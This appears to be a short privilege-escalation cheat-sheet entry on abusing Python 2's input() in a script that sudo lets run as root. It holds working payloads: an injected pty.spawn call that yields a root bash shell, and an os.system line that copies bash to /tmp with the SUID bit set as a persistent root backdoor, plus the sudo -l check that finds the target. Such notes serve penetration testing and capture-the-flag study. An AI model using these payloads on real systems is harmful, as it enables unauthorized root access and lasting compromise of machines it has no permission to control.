# Python2 input() Sudo Eval Abuse

Python 2's `input()` evaluates the expression the user types (unlike Python 3's `input()` which treats it as a string). When a script running as root calls `input()`, the interactive prompt is a code-execution vector.

```bash
sudo -l    # look for: (root) NOPASSWD: /usr/bin/python2.7 /path/to/script.py

sudo python2.7 /path/to/script.py
# at the prompt type:
__import__('pty').spawn('/bin/bash')
# or for a non-interactive context:
__import__('os').system('cp /bin/bash /tmp/b && chmod +s /tmp/b')
```

After the `system()` call: `/tmp/b -p` gives a SUID root shell.

The vulnerability is the `input()` call itself — any argument the user provides is passed to Python's `eval()`. No special setup needed beyond the sudo permission.
